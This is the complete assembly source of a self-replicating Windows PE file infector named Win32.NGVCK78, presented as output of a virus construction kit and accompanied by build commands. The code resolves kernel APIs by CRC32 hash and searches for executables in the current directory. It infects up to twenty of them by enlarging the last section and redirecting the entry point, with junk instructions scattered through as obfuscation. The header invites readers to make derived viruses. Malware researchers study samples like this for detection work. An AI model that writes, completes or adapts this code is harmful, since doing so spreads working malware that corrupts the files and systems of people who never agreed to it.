              
;
;
; Win32.NGVCK78 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK78
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 41
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edx
 push edx
                                        ; round to pages
 mov dx, 0h
                                        ; add edx, 1
 inc edx
GetKernelLoop:
                                        ; clear eax
 mov eax, 0
 dec edx
 mov ax, word ptr [edx+03ch]
 test ax,0f800h
 jnz GetKernelLoop
 cmp edx, dword ptr [edx+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], edx
                                        ; add edx, 60
 inc edx
 add edx, 59d
 mov eax, [edx]
 sub edx, 60d
 add eax, edx
 mov [KernelPE+ebp], eax
 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, -23795d
 add ecx, 23795d
 add ecx, [esi+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov esi, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
 and edx, ecx                           ; Trash
                                        ; get NTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get OTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
 jmp GetApis

;                  [ ///// * Data * \\\\\ ]

Data:
 FileHandle  dd 0h
 TempApisearch3 dd 0h
 MapAddress  dd 0h
 InfCounter  dd 0h
 AlignReg2   dd 0h
 KernelPE    dd 0h
 NTableTemp  dd 0h
 TempApisearch2 dd 0h
 NewSize     dd 0h
 OldEIP      dd 0h
 counter     dw 0h
 APICRC32    dd 0h
 MapHandle   dd 0h
 filemask    db '*.eXE',0
 KernelMZ    dd 0h
 ATableVA    dd 0h
 FindHandle  dd 0h

 APINames:
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 068624A9Dh           ; CloseHandle
 dd 08C892DDFh           ; CreateFileA
 dd 0797B49ECh           ; MapViewOfFile
 dd 094524B42h           ; UnmapViewOfFile
 dd 0C200BE21h           ; FindClose
 dd 0AA700106h           ; FindNextFileA
 dd 096B2D96Ch           ; CreateFileMappingA

 Trash1      dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h
 XCreateFileMappingA    dd 0h

 NTableVA    dd 0h
 db 'Virus : Win32.NGVCK78 Author : SnakeByte',0
 OldBase     dd 400000h
 NewEIP      dd 0h
 AlignReg1   dd 0h
 TempAPI     dd 0h
 OTableVA    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)





;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov eax, edi
 mov eax, edi
LenCRC:
                                        ; add eax, 1
 inc eax
 cmp byte ptr [eax], 0
 jne LenCRC
 sub eax, edi
                                        ; mov esi, eax
 mov esi, eax
                                        ; add esi, 1
 sub esi, -1d
 cld
                                        ; clear ecx
 and ecx, 0
 sub ecx, 1
                                        ; mov ebx, ecx
 push ecx
 pop ebx
NextByteCRC:
                                        ; clear eax
 mov eax, 37257d
 sub eax, 37257d
                                        ; clear edx
 mov edx, -45639d
 add edx, 45639d
 mov al, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 xor al, cl
 mov cl, ch
 mov ch, bl
 mov bl, bh
 mov bh, 8
NextBitCRC:
 shr dx, 1
 rcr ax, 1
jnc NoCRC
 xor ax,08320h
 xor dx,0EDB8h
NoCRC:
 dec bh
jnz NextBitCRC
 xor ecx, eax
 xor ebx, edx
 dec esi
jnz NextByteCRC
 not ebx
 not ecx
 mov eax, ebx
 rol eax, 16d
 mov ax, cx
 mov dword ptr [ebp+APICRC32], eax
 popad
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
                                        ; check for minimum filesize
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx edx, word ptr [edi]
 sub edx, 'ZM'
 jz Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [edi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov esi, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],esi
 jb Notagoodfile
 add esi, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
                                        ; mov ebx, 30023
 mov ebx, 30023d
 cmp ebx, 30023d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

                                        ; clear esi
 mov esi, 0
 add esi, dword ptr [ebp+OldBase]
 sub eax, ecx                           ; Trash

 mov dword ptr [ebp+retBase], esi



                                        ; number of API's we're looking for
 push NumberOfApis
 pop edx

                                        ; load API Names and Offsets
 lea edi, [ebp+APIOffsets]
 xchg edi, esi

 lea ebx, [ebp+APINames]


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add ebx, 4
 add ebx, 4d
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 add esi, 4d
 sub edx, 1
 jnz GetApisLoop
 lea eax, [ebp+Outbreak]
 xchg eax, edx

 push edx
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx

 push dword ptr [ebp+OldBase]
 pop eax

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 jmp ebx



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 push 0
 pop eax

 push eax
 push eax
 push 3h
 push eax
                                        ; add eax, 1
 add eax, 1d
 push eax
 mov ebx, 80000000h or 40000000h
 push ebx
 lea esi, [ebp+WFD_szFileName]
 xchg esi, edi

 push edi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax
 sub ebx, 71272997d                     ; Trash

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop edx
 push edx
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
 or eax, eax
 jz CloseFile
                                        ; clear ebx
 and ebx, 0
 push edx
 push ebx
 push ebx
                                        ; mov eax, 2
 mov eax, 2d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2
 or ecx, 29721302d                      ; Trash

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 mov ebx, ebx                           ; Trash
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov ebx, offset WFD_szFileName
 add ebx, ebp

                                        ; mov ecx, 276
 push 276d
 pop ecx

ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 inc ebx
 dec ecx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]

 push edi
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg esi, edx

 push esi
 push dword ptr [ebp+FindHandle]
 pop edx
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret





;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
 not edx                                ; Trash




 push dword ptr [ebp+NTableVA]
 pop edx


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 xor dword ptr [ebp+NTableTemp], edx
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [edx]
                                        ; mov edx, ecx
                                        ; clear edx
 xor edx, edx
 add edx, ecx
                                        ; mov edi, ecx
                                        ; clear edi
 mov edi, 31387d
 sub edi, 31387d
 add edi, ecx
 mov dword ptr [ebp+TempApisearch2], edi
 mov dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov ecx, dword ptr [ebp+APICRC32]
 xor dword ptr [ebp+Trash1], eax        ; Trash
 sub ecx, dword ptr [ebx]
                                        ; add ecx, 1
 sub ecx, -1d
 sub ecx, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 mov ebx, dword ptr [ebp+TempApisearch3]
 mov edx, dword ptr [ebp+NTableTemp]
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add edx, 4
 dec edx
 add edx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, edx
                                        ; clear eax
 mov eax, -4136d
 add eax, 4136d
 mov ax, word ptr [edx]
 clc
 rcl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [eax]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea edx, [ebp+filemask]
 xchg eax, edx

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ecx
 sub ecx, 1
 inc ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear edx
 mov edx, -19633d
 add edx, 19633d
 xor edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

 shr edx, 23d                           ; Trash
InfectEXE:                              ; infect an exe file
 mov edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [edx+3Ch]
 add esi, edx
                                        ; get File Alignment
 mov edx, [esi+3Ch]
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], edx
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 and esi, 0
 add esi, ebx
                                        ; get last section
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [esi+06h]
 dec eax
 imul eax, eax, 28h
                                        ; add ebx, 120
 add ebx, 120d
 add ebx, eax
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [esi+74h]
 shl ecx, 3
 add ebx, ecx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov ecx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov eax, [ebx+10h]
                                        ; mov ecx, eax
                                        ; clear ecx
 mov ecx, 0
 add ecx, eax
 add ebx, 14h
 add eax, [ebx]
 sub ebx, 14h
 push eax
 push ecx
 pop edx
 add edx, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], edx
 xor dword ptr [ebp+Trash1], edx        ; Trash
                                        ; clear edx
 xor edx, edx

 add edx, [ebx+10h]
 push edx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add edx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 add dword ptr [ebp+Trash1], 717960     ; Trash
 mov dword ptr [ebx+10h], edx
 pop edx
 add edx, VirusSize
 mov dword ptr [ebx+08h], edx
 mov edx, dword ptr [ebx+0Ch]
 add edx, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 dec ebx
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

